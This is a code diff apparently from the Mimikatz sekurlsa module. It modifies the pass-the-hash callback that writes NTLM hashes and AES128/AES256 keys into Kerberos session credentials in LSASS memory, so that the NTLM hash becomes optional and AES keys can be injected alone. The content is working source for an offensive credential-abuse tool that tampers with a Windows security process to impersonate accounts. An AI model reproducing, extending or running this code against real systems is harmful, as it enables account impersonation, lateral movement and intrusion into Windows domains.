@@ -222,7 +222,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY
 	PSEKURLSA_PTH_DATA pthData = (PSEKURLSA_PTH_DATA) pOptionalData;
 	DWORD i, nbHash;
 	BYTE ntlmHash[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
-	BOOL isAes128 = FALSE, isAes256 = FALSE;
+	BOOL isNtlm = FALSE, isAes128 = FALSE, isAes256 = FALSE;
 	UNICODE_STRING nullPasswd = {0, 0, NULL};
 	KULL_M_MEMORY_ADDRESS aLocalKeyMemory = {NULL, Localkerbsession.hMemory}, aLocalHashMemory = {NULL, Localkerbsession.hMemory}, aLocalNTLMMemory = {NULL, Localkerbsession.hMemory}, aLocalPasswdMemory = {&nullPasswd, Localkerbsession.hMemory}, aRemotePasswdMemory = {(PBYTE) RemoteLocalKerbSession.address + kerbHelper[KerbOffsetIndex].offsetCreds + FIELD_OFFSET(KIWI_GENERIC_PRIMARY_CREDENTIAL, Password), RemoteLocalKerbSession.hMemory};
 	PKERB_HASHPASSWORD_GENERIC pHash;
@@ -238,22 +238,24 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY
 			{
 				if(nbHash = ((DWORD *)(aLocalKeyMemory.address))[1])
 				{
-					RtlCopyMemory(ntlmHash, pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
-					if(pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_VISTA)
+					if(isNtlm = (pthData->NtlmHash != NULL))
 					{
-						(*pData->lsassLocalHelper->pLsaProtectMemory)(ntlmHash, LM_NTLM_HASH_LENGTH);
-						if(pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_BLUE)
+						RtlCopyMemory(ntlmHash, pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
+						if(pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_VISTA)	
+							(*pData->lsassLocalHelper->pLsaProtectMemory)(ntlmHash, LM_NTLM_HASH_LENGTH);
+					}
+					
+					if(pData->cLsass->osContext.BuildNumber >= KULL_M_WIN_BUILD_BLUE)
+					{
+						if(isAes128 = (pthData->Aes128Key != NULL))
 						{
-							if(isAes128 = (pthData->Aes128Key != NULL))
-							{
-								RtlCopyMemory(aes128key, pthData->Aes128Key, AES_128_KEY_LENGTH);
-								(*pData->lsassLocalHelper->pLsaProtectMemory)(aes128key, AES_128_KEY_LENGTH);
-							}
-							if(isAes256 = (pthData->Aes256Key != NULL))
-							{
-								RtlCopyMemory(aes256key, pthData->Aes256Key, AES_256_KEY_LENGTH);
-								(*pData->lsassLocalHelper->pLsaProtectMemory)(aes256key, AES_256_KEY_LENGTH);
-							}
+							RtlCopyMemory(aes128key, pthData->Aes128Key, AES_128_KEY_LENGTH);
+							(*pData->lsassLocalHelper->pLsaProtectMemory)(aes128key, AES_128_KEY_LENGTH);
+						}
+						if(isAes256 = (pthData->Aes256Key != NULL))
+						{
+							RtlCopyMemory(aes256key, pthData->Aes256Key, AES_256_KEY_LENGTH);
+							(*pData->lsassLocalHelper->pLsaProtectMemory)(aes256key, AES_256_KEY_LENGTH);
 						}
 					}
 
@@ -272,7 +274,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY
 								
 								RemoteLocalKerbSession.address = pHash->Checksump;
 								resultok = L"OK";
-								if((pHash->Size == LM_NTLM_HASH_LENGTH) && (pHash->Type != KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) && (pHash->Type != KERB_ETYPE_AES256_CTS_HMAC_SHA1_96))
+								if(isNtlm && ((pHash->Type != KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) && (pHash->Type != KERB_ETYPE_AES256_CTS_HMAC_SHA1_96)) && (pHash->Size == LM_NTLM_HASH_LENGTH))
 								{
 									aLocalNTLMMemory.address = ntlmHash;
 									offset = LM_NTLM_HASH_LENGTH;
